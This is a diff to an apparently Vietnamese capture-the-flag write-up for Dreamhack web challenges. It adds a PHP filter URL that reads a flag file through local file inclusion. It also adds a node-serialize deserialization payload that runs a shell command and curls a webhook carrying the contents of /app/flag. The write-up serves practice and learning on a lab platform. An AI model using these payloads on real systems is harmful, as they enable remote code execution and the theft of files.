@@ -357,4 +357,10 @@ if __name__ == "__main__":
 ### php-1
 ```http://host3.dreamhack.games:10501/?page=php://filter/convert.base64-encode/resource=/var/www/uploads/flag```
 ### out of money
-- 
+## Level 2
+### node-serialize
+- một lỗi cơ bản mà mình đã giải thích ở WU rootme trước đây, tuy nhiên trong Chall này chúng ta chỉ có thể RCE với webhook của dreamhack do là họ đã giới hạn port outbound.
+```
+{"username":"_$$ND_FUNC$$_function(){require('child_process').exec('curl https://xfyybai.request.dreamhack.games/?c=$(cat /app/flag)'); return 'nope';}()", "country":"Korea"}
+```
+
